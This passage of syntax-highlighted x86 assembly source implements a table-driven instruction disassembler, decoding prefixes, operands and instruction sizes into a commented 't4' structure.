</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">20</span><span class="sc0">
</span><span class="sc6">popad</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">disasmit</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc5">t4sizeof</span><span class="sc0">        </span><span class="sc1">; just a simple disasm :)</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">getnext5</span><span class="sc0">
</span><span class="sc5">getnext5</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">iitable</span><span class="sc4">-</span><span class="sc5">getnext5</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">tab@disasm</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">retminusone</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">

</span><span class="sc5">retminusone</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">t4size</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">retanyway</span><span class="sc0">

</span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0">  </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">t4argum</span><span class="sc4">+</span><span class="sc5">t4argtype</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">t4insoff</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">t4argum</span><span class="sc4">+</span><span class="sc5">t4argvalue</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">retanyway</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">t4sizeof</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; This part of program should translate a binary into computable</span><span class="sc0">
</span><span class="sc1">; comprehensible structure, see table1</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; esi = offset to instruction</span><span class="sc0">
</span><span class="sc1">; edi = offset to the t4 strucute</span><span class="sc0">
</span><span class="sc1">; ebx = offset to table</span><span class="sc0">
</span><span class="sc1">;   tab-4 structre</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       0 - prefixes</span><span class="sc0">
</span><span class="sc5">t4prefix</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc1">;       1 - w type.word type value</span><span class="sc0">
</span><span class="sc5">t4word</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc1">;       2 - o type.operand type value</span><span class="sc0">
</span><span class="sc5">t4oper</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
</span><span class="sc1">;       3 - r type.register value</span><span class="sc0">
</span><span class="sc5">t4reg</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
</span><span class="sc1">;       4 - m type.memory register value</span><span class="sc0">
</span><span class="sc5">t4mem</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
</span><span class="sc1">;       5 - s type.segment type value</span><span class="sc0">
</span><span class="sc5">t4seg</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">
</span><span class="sc1">;       6 - c type.condition type value</span><span class="sc0">
</span><span class="sc5">t4cond</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc0">
</span><span class="sc1">;       7 - codec value: 0 = 32 bit 1 = 16 bit</span><span class="sc0">
</span><span class="sc5">t4codec</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">
</span><span class="sc1">;       8 - offset of instruction</span><span class="sc0">
</span><span class="sc5">t4offset</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
</span><span class="sc1">;  </span><span class="sc0">
</span><span class="sc1">;       12 - operand 1 type: 0 = value, 1 = reg, 2 = mem, </span><span class="sc0">
</span><span class="sc1">;                       3 = extended, 4 = destination</span><span class="sc0">
</span><span class="sc5">t4argum</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">12</span><span class="sc0">
</span><span class="sc5">t4argsizeof</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
</span><span class="sc5">t4argum2</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">t4argum</span><span class="sc4">+</span><span class="sc5">t4argsizeof</span><span class="sc0">
</span><span class="sc5">t4argtype</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">t4argsize</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">t4argextreg</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
</span><span class="sc5">t4argvalsize</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
</span><span class="sc5">t4argvalue</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
</span><span class="sc1">;+1     - 13 - affected size</span><span class="sc0">
</span><span class="sc1">;+2     - 14 - (if) extended value ( la intel: aabbbccc = b+(c*2^a)</span><span class="sc0">
</span><span class="sc1">;+3     - 15 - value size (1-2-4)</span><span class="sc0">
</span><span class="sc1">;+4     - 16 - value</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       20 - respect the same structure as upper</span><span class="sc0">
</span><span class="sc1">;           21-22-23-24</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       Offset designed for communication with other t4 modules</span><span class="sc0">
</span><span class="sc1">;       </span><span class="sc0">
</span><span class="sc1">;       28 - offset from beginning of the table of the precise instr.</span><span class="sc0">
</span><span class="sc5">t4taboff</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">t4argum</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">t4argsizeof</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">t4argsizeof</span><span class="sc0">
</span><span class="sc1">;       32 - offset from beginning of the table of the instruction</span><span class="sc0">
</span><span class="sc5">t4insoff</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">t4taboff</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
</span><span class="sc1">;       36 - offset from beginning of the table of the operand</span><span class="sc0">
</span><span class="sc5">t4opoff</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">t4insoff</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc1">;       40 - cleaned instruction</span><span class="sc0">
</span><span class="sc5">t4clean</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">t4opoff</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
</span><span class="sc1">;       44 - instruction size (a byte)</span><span class="sc0">
</span><span class="sc5">t4size</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">t4clean</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc1">;       </span><span class="sc0">
</span><span class="sc5">t4sizeof</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">t4size</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">

</span><span class="sc5">tab@disasm</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebp</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">16</span><span class="sc0">

</span><span class="sc5">tab@valcounter</span><span class="sc0">          </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">8</span><span class="sc0">
</span><span class="sc5">tab@origoff</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">tab@orignow</span><span class="sc0">         </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">t4prefix</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">t4taboff</span><span class="sc4">],</span><span class="sc8">ebp</span><span class="sc0">                    </span><span class="sc1">; set some datas</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">t4offset</span><span class="sc4">],</span><span class="sc8">esi</span><span class="sc0">                    </span><span class="sc1">; for further purpose</span><span class="sc0">

</span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">tab@valcounter</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">                </span><span class="sc1">; make a counter</span><span class="sc0">
                                                        </span><span class="sc1">; for operands loop</span><span class="sc0">
</span><span class="sc5">testagainintable</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">tab@skipprefix</span><span class="sc0">                                  </span><span class="sc1">; don't analyze</span><span class="sc0">
                                                        </span><span class="sc1">; prefixes operation</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">                               </span><span class="sc1">; look if</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">tab@skipprefix0</span><span class="sc0">                                 </span><span class="sc1">; we don't have </span><span class="sc0">
                                                        </span><span class="sc1">; set it yet</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">tab@valcounter</span><span class="sc4">]</span><span class="sc0">                </span><span class="sc1">; watch were</span><span class="sc0">
                                                        </span><span class="sc1">; in table</span><span class="sc0">
</span><span class="sc6">ror</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">t4prefix</span><span class="sc4">],</span><span class="sc8">cl</span><span class="sc0">

</span><span class="sc6">bt</span><span class="sc0">      </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">t4prefix</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">                      </span><span class="sc1">; have we set it?</span><span class="sc0">
</span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">tab@skipprefix0</span><span class="sc0">

</span><span class="sc6">or</span><span class="sc0">      </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">t4prefix</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">                       </span><span class="sc1">; no, the set it</span><span class="sc0">
</span><span class="sc6">rol</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">t4prefix</span><span class="sc4">],</span><span class="sc8">cl</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">t4taboff</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">tab@valcounter</span><span class="sc4">],-</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">                                           </span><span class="sc1">; we need to </span><span class="sc0">

</span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc0">                                             </span><span class="sc1">; restart from the</span><span class="sc0">
                                                        </span><span class="sc1">; begining</span><span class="sc0">
</span><span class="sc5">tab@skipprefix0</span><span class="sc4">:</span><span class="sc0">                                        </span><span class="sc1">; (to avoid such</span><span class="sc0">
                                                        </span><span class="sc1">; 6666h anti dis)</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">tab@valcounter</span><span class="sc4">]</span><span class="sc0">                  </span><span class="sc1">; go again</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">                                           </span><span class="sc1">; take next entry</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">testagainintable</span><span class="sc0">

</span><span class="sc5">tab@skipprefix</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">                              </span><span class="sc1">; load current </span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                                         </span><span class="sc1">; instruction</span><span class="sc0">
</span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0F0h</span><span class="sc0">                                        </span><span class="sc1">; in table</span><span class="sc0">
</span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">00Fh</span><span class="sc0">
</span><span class="sc6">ror</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">                                           </span><span class="sc1">; load size/type</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">tab@valcounter</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">                </span><span class="sc1">; save size</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">allokay</span><span class="sc0">                                         </span><span class="sc1">; check if 4</span><span class="sc0">

</span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">                                             </span><span class="sc1">; +4 byte ins</span><span class="sc0">
</span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">                                             </span><span class="sc1">; are saved on 2 :)</span><span class="sc0">

</span><span class="sc5">allokay</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">t4opoff</span><span class="sc4">],</span><span class="sc8">esi</span><span class="sc0">                     </span><span class="sc1">; save instruction</span><span class="sc0">
                                                        </span><span class="sc1">; offset</span><span class="sc0">
</span><span class="sc5">detect1</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                                           </span><span class="sc1">; check if we</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">detect2</span><span class="sc0">                                         </span><span class="sc1">; have a zero</span><span class="sc0">
                                                        </span><span class="sc1">; type</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc5">tab@origoff</span><span class="sc4">],</span><span class="sc8">esi</span><span class="sc0">               </span><span class="sc1">; (instruction)</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc5">tab@orignow</span><span class="sc4">],</span><span class="sc8">esi</span><span class="sc0">               </span><span class="sc1">; set instruction/</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">t4insoff</span><span class="sc4">],</span><span class="sc8">esi</span><span class="sc0">                    </span><span class="sc1">; argument as detect.</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">]</span><span class="sc0">                       </span><span class="sc1">; load argument</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">                                           </span><span class="sc1">; point to instruc.</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">testentry</span><span class="sc0">                                       </span><span class="sc1">; load instruction</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">

</span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">]</span><span class="sc0">                                 </span><span class="sc1">; point to end of ins.</span><span class="sc0">

</span><span class="sc5">detect2</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                                           </span><span class="sc1">; check for an inst</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">detect3</span><span class="sc0">                                         </span><span class="sc1">; w/o operand</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">t4insoff</span><span class="sc4">],</span><span class="sc8">esi</span><span class="sc0">                    </span><span class="sc1">; then save ins</span><span class="sc0">
                
</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc5">tab@origoff</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">; save instr.</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc5">tab@orignow</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">               </span><span class="sc1">; from the sliding(*)</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">]</span><span class="sc0">                       </span><span class="sc1">; load operand</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">testentry</span><span class="sc0">                                       </span><span class="sc1">; check instruction</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">

</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">detect3</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">                                           </span><span class="sc1">; compare a variance</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">detect4</span><span class="sc0">                                         </span><span class="sc1">; with instruct.</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">t4opoff</span><span class="sc4">],</span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">                                           </span><span class="sc1">; point to instr.</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">testentry</span><span class="sc0">                                       </span><span class="sc1">; check ins.</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">

</span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">]</span><span class="sc0">                                 </span><span class="sc1">; go to next instr.</span><span class="sc0">

</span><span class="sc5">detect4</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">detect5</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc5">tab@orignow</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">; load operand</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">t4opoff</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">                                             </span><span class="sc1">; point to start</span><span class="sc0">
